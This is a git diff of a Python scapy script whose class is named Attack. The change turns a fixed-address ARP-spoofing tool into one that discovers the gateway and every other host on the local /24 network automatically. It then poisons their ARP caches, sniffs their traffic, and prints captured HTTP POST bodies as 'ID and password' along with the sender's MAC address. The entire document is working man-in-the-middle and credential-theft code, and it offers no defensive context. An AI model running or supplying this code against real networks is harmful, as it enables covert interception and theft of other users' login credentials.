@@ -11,20 +11,27 @@ class Attack():
         self.network = []
         self.ip_mac = {}
         self.interfaces = ni.interfaces()
-        self.attacker, self.victim, self.ap = '192.168.28.128', '192.168.28.130', '192.168.28.1'
+        self.attacker, self.victim, self.ap = '',[],''
 
     def get_ip(self):
         for i in self.interfaces:
             self.ip_list.append(ni.ifaddresses(i)[2][0]['addr'])
         self.network = ['.'.join(i.split('.')[:-1]) + '.0/24' for i in self.ip_list]
+        self.attacker = self.ip_list[1]
 
     def get_mac(self, network):
         arp_request = scapy.ARP(pdst = network)
         broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
         arp_request_broadcast = broadcast / arp_request
-        result = scapy.srp(arp_request_broadcast, timeout = 3, verbose = False)[0]
+        result = scapy.srp(arp_request_broadcast, timeout = 3, verbose = False)[0]	
+        count = 0
         for sent, received in result:
             self.ip_mac[received.psrc] = received.hwsrc
+            if(count == 0):
+                self.ap = received.psrc
+            elif(count > 0):
+                self.victim.append(received.psrc)
+            count += 1    
 
     def spoof(self, target_ip, spoof_ip): 
         target_mac = self.ip_mac[target_ip]
@@ -49,7 +56,8 @@ class Attack():
         if packet.haslayer(HTTPRequest):
             method = packet[HTTPRequest].Method.decode()
             if packet.haslayer(scapy.Raw) and method == "POST":
-                print("\nRaw Data: ", packet[scapy.Raw].load)
+                print("\nID and password: ", packet[scapy.Raw].load)
+                print("Came from: ", packet[scapy.Ether].src)
         #if packet[scapy.Ether].src == self.ip_mac[self.victim]:	
         #    packet[scapy.Ether].dst = self.ip_mac[self.ap]
         #if packet[scapy.Ether].src == self.ip_mac[self.ap]:
@@ -57,21 +65,18 @@ class Attack():
         #packet[scapy.Ether].src = self.ip_mac[self.attacker]        
         #scapy.send(packet,verbose=0)
 
-    def sniff_packet(self):
-        while 1:
-            scapy.sniff(filter="host "+self.victim, prn=self.process_packet, iface=self.interfaces[1])
-            scapy.sniff(filter="host "+self.ap, prn=self.process_packet, iface=self.interfaces[1])
-
     def arp_spoofing(self):
         while 1:
-            self.spoof(self.victim, self.ap)
-            self.spoof(self.ap, self.victim)
-            scapy.sniff(filter="host "+self.victim, prn=self.process_packet, iface='ens33')
+            for v in self.victim:
+                self.spoof(v, self.ap)
+                self.spoof(self.ap, v)
+                scapy.sniff(filter="ether src "+self.ip_mac[v], prn=self.process_packet, iface=self.interfaces[1])
             time.sleep(1)
 
     def ret_arp_spoofing(self):
-        self.restore(self.ap, self.victim)
-        self.restore(self.victim, self.ap)
+        for v in self.victim:
+            self.restore(self.ap, v)
+            self.restore(v, self.ap)
 
 attack = Attack()
 attack.get_ip()
@@ -80,7 +85,6 @@ attack.enable_ip_route()
 print(attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
 try:
     attack.arp_spoofing()
-    #attack.sniff_packet()
 except KeyboardInterrupt:
     attack.ret_arp_spoofing()
 
